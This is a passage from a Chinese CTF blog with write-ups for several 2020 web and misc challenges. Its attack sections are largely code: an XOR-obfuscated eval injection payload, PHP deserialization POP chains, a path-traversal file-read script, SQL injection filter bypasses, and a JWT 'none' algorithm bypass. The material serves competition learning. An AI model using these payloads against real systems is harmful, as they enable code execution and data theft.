class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span> || $arr[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，模板中有错误的判断,请修正【&#x27;</span>.$ifstr.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，模板中有错误的判断,请修正&#x27;</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . $ifstr . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">&#x27;if&#x27;</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;if&#x27;</span> . $matches3[ <span class="number">1</span> ], <span class="string">&#x27;&#123;if&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;else&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;end if&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;end if&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params"> $s, $str=<span class="string">&#x27;,&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看到<code>parserIfLabel</code>函数里的正则</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>[\s\S]</code>表示通配，看到后面有一个<code>eval</code>函数，尝试是否可以写进函数。</p>
<p>这里随便试一下可以发现，这个正则式可以匹配的。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200821150736049.png" alt="image-20200821150736049" style="high:80%;width:80%;" />

<p>这里在本地测试把<code>danger_key</code>过滤函数去掉之后发现，再传<code>phpinfo</code></p>
<p>直接出现<code>phpinfo()</code>的页面</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200821093807478.png" alt="image-20200821093807478" style="high:80%;width:80%;" />

<p>然后就是绕过<code>danger_key</code>，这里过滤php以及一些函数等等，尝试用异或构造字符。</p>
<p>异或构造<code>phpinfo()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;4:49:R9&#x27;</span>^<span class="string">&#x27;DRDPT4V&#x27;</span>)()//phpinfo()</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2zebqdx3ky4mu3qy28yg.cloudeci1.ichunqiu.com/?a=&#123;if:%20(%274:49:R9%27^%27DRDPT4V%27)()&#125;()&#123;end%20%20%20if&#125;</span><br></pre></td></tr></table></figure>

<p>直接在phpinfo里面发现flag。</p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a><strong>easytrick</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>这里发现需要<code>$trick1</code>和<code>$trick2</code>不相等，但是md5值相等的强绕过，还限制了长度不能超过5，而且<code>$trick1</code>被转为了<code>string</code>，数组绕过发现不可行。</p>
<p>这里就是两个不同类型的变量，一个<code>float</code>，一个<code>string</code>，在做比较时不相等，在md5处理时相等。这里可以用php的INF（无穷大）。</p>
<p>构造序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zei1qumnps7gku8ou0x.cloudeci1.ichunqiu.com&#x2F;?trick&#x3D;O:5:%22trick%22:2:&#123;s:6:%22trick1%22;d:INF;s:6:%22trick2%22;d:INF;&#125;</span><br></pre></td></tr></table></figure>

<p>回显看到flag。</p>
<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a><strong>babyunserialize</strong></h2><p>WMCTF的链，改改就能用了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span>  $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> $events;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">phpinfo</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[-1=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;<span class="title">kawi</span>&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params">$offset, $value</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$val</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2ze0y4x958n38d0jl6pv.cloudeci1.ichunqiu.com/?flag=a%3A2%3A%7Bi%3A0%3BO%3A6%3A%22CLI%5CWS%22%3A0%3A%7B%7Di%3A1%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3Br%3A3%3Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3Bs%3A0%3A%22%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>

<p>flag在phpinfo里面。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>安恒七月赛 2020</title>
    <url>/2020/07/26/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<p>就几道题，水一下<a id="more"></a></p>
<h3 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a><strong>ezfileinclude</strong></h3><p>打开题目链接后显示出来的是一张图片，查看网页源代码会在img标签种发现一个/image.php?t=xxxxx&amp;f=base64(xxxx)</p>
<p>这道题目考点也是文件读取，所以利用点肯定在f这个参数了，但只是过滤了开头的<code>../</code></p>
<p>这里用一下Hhhm师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;hhhm/../../../../../../../../flag&quot;</span></span><br><span class="line">file = base64.b64encode(file.encode())</span><br><span class="line">url = <span class="string">&quot;http://183.129.189.60:10009/image.php?t=&#123;0&#125;&amp;f=&#123;1&#125;&quot;</span></span><br><span class="line">now = int(time.time())</span><br><span class="line">rep = requests.get(url.format(str(now),file.decode()))</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></table></figure>

<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;t&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you miss some parameters&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">&#x27;t&#x27;</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s your time?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/../&quot;</span>)) === <span class="string">&quot;/../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;../&quot;</span>)) === <span class="string">&quot;../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;./&quot;</span>)) === <span class="string">&quot;./&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/.&quot;</span>)) === <span class="string">&quot;/.&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;//&quot;</span>)) === <span class="string">&quot;//&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not allowed to do that.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/img/&#x27;</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Sqil"><a href="#Sqil" class="headerlink" title="Sqil"></a><strong>Sqil</strong></h3><p>首先fuzz之后发现正则</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i&quot;</span>, $id);</span><br></pre></td></tr></table></figure>

<p>发现过滤in和or被过滤了，意味着information_schema不能使用</p>
<p>一般来说绕过information有两种</p>
<ul>
<li>sys.x$schema_flattened_keys</li>
<li>sys.schema_table_statistics_with_buffer</li>
</ul>
<p>但是第二种里的stat被过滤了，可以使用第一种方法，注出表名payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,group_concat(table_name)from/**/sys.x$schema_flattened_keys/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; 1 [id] =&gt; 1 [1] =&gt; 2 [username] =&gt; 2 [2] =&gt; flllaaaggg,users [password] =&gt; flllaaaggg,users )</span><br></pre></td></tr></table></figure>

<p>发现有flllaaaggg,users两种表，这里可以使用无列名注入，无列名注入可参考：<a class="foo" href="https://www.jianshu.com/p/6eba3370cfab" target="_blank">不知道列名的情况下注入</a></p>
<p>查看users表内容</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(c)/**/from(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select*from/**/users)x)%23</span><br></pre></td></tr></table></figure>

<p>查看fllllaaaggg表内容</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/a,2/**/as/**/b/**/union/**/select*from/**/flllaaaggg)x)%23</span><br></pre></td></tr></table></figure>

<h3 id="MISC-welcome"><a href="#MISC-welcome" class="headerlink" title="MISC-welcome"></a><strong>MISC-welcome</strong></h3><p>前面没记错的话，应该是虎符的原题吧，题目附件是两个文件，一个<code>flag.rar</code>  一个<code>red_blue.png</code>。</p>
<p>用<code>stegsolve</code>查看图片，<code>Save Bin</code>可直接得到图片提取出来发现是密码为<code>/*///1258/*/@#</code></p>
<p>360解压打开发现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Ao(mgHXo,o0fV<span class="string">&#x27;I2J&quot;^%3&amp;**H@q.MQ1,V%$1GCdB0P&quot;X%0RW</span></span><br></pre></td></tr></table></figure>

<p>当时没想到是base85编码，所以没做出来</p>
<p>在线解密得到flag：<a href="http://ctf.ssleye.com/base85.html">http://ctf.ssleye.com/base85.html</a></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>虎符&amp;MRCTF 2020</title>
    <url>/2020/04/24/%E8%99%8E%E7%AC%A6%E5%92%8CMRCTF/</url>
    <content><![CDATA[<p>这次复现的题目是师兄本周开会讲的题目，我都复现了一下，又学到了新的东西。题目具体详情可以参考师兄的文章：<a class="foo" target="_blank" href="https://www.plasf.cn/2020/04/20/HFCTF_WP/">传送门</a><a id="more"></a></p>
<h2 id="虎符"><a href="#虎符" class="headerlink" title="虎符"></a><strong>虎符</strong></h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a><strong>easy_login</strong></h3><p>首先打开题目源码发现static/js/app.js，进去后发现koa</p>
<p>利用 koa-static 错误配置的源码泄露获得源码，进行审计。直接读取app.js</p>
<p>koa是基于Node.js的web框架。然后再进去controller.js</p>
<p>再进入controllers/api.js。api是通过抓包发现的</p>
<p>源码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>jwt可以通过这个网站解析：<a class="foo" target="_blank" href="https://jwt.io/">传送门</a></p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200423184848460.png" alt="image-20200423184848460" style="high:80%;width:80%;" />

<p>了解JWT的组成后，我们总结JWT可能存在如下的安全问题：</p>
<blockquote>
<p>1.修改头什么的算法为none</p>
<p>2.若secret较短可以直接使用<a class="foo" target="_blank" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
<p>3.秘钥泄露</p>
<p>3.修改算法RS256为HS256</p>
</blockquote>
<p>在这道题中明显是修改算法为none进行绕过。</p>
<p>这里就是注册的时候会生成一个jwt，登录的时候验证这个jwt。</p>
<p>这里写一个脚本构造出jwt</p>
